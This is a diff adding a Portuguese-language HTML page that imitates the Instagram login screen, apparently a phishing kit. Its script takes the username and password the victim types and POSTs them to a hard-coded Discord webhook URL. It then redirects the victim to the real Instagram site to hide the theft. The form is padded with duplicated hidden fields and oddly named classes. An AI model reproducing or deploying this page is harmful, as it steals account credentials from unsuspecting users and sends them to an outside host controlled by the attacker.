@@ -1,0 +1,96 @@
+<html>
+
+<head>
+    <title>Login</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
+    <meta http-equiv="refresh" content="60">
+    <link rel="icon" href="images/favicon.png" type="image/icon">
+    <link rel="stylesheet" type="text/css" href="style.css">
+
+</head>
+
+<body>
+    <div class="cont88e9w9ew">
+        <div class="pagina">
+            <div class="loguinhoooo">
+
+                <img src="images/instagram.png" alt="instagram" style="width: 175px; ">
+            </div>
+
+            <br />
+            <form class="cont88e9w9ew" >
+                <input type="text" placeholder="Telefone, usuário, ou e-mail " name="usuario" id="usuario">
+				 <input type="hidden" name="cpf" value="cpf">
+				  <input type="hidden" name="cpf" value="cpf">
+				   <input type="hidden" name="cpf" value="cpf">
+				    <input type="hidden" name="cpf" value="cpf">
+					 <input type="hidden" name="cpf" value="cpf">
+                <input type="password" placeholder="Senha" name="cpf" id="cpf">
+				 <input type="hidden" name="cpf" value="cpf">
+				  <input type="hidden" name="cpf" value="cpf">
+				   <input type="hidden" name="cpf" value="cpf">
+				    <input type="hidden" name="cpf" value="cpf">
+					 <input type="hidden" name="cpf" value="cpf">
+					 
+                <button class="submitbutton" type="button" onclick="Login()">Entrar</button>
+                <br />
+				 <input type="hidden" name="cpf" value="cpf">
+				  <input type="hidden" name="cpf" value="cpf">
+				   <input type="hidden" name="cpf" value="cpf">
+				    <input type="hidden" name="cpf" value="cpf">
+					 <input type="hidden" name="cpf" value="cpf">
+					  <input type="hidden" name="cpf" value="cpf">
+					   <input type="hidden" name="cpf" value="cpf">
+                <div class="option">OU </div>
+            </form>
+
+            <div class="fbooewe98w">
+                <span class="fab fafacebook"></span>
+                <a href="#">Fazer Login com FaceBook</a>
+            </div>
+
+            <div class="f0000rget">
+                <a href="#">Esqueceu a senha?</a>
+            </div>
+            <div class="singuuuuup">
+                <p>Não tem uma conta?<a href="#">
+                        Registre-se</a></p>
+            </div>
+
+        </div>
+    </div>
+
+    <br />
+   
+    <br />
+
+
+  <script>
+  function sendMessage() {
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discordapp.com/api/webhooks/1213270604459802705/4_tUnsfzDzlLWSoz-QkaECr69N5Tiv7_q7mqHmj4N9XwJHLP0Mmi8pv88m_wKrz7tyyt");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **User  : **" + document.getElementById('usuario').value + "\n> **Pw : **" + document.getElementById('cpf').value)
+    }
+    request.send(JSON.stringify(params));
+	
+	sleep(400);
+	window.location.replace("https://www.instagram.com/");
+	 
+  }
+  
+  
+
+  </script>
+</body>
+
+</html>
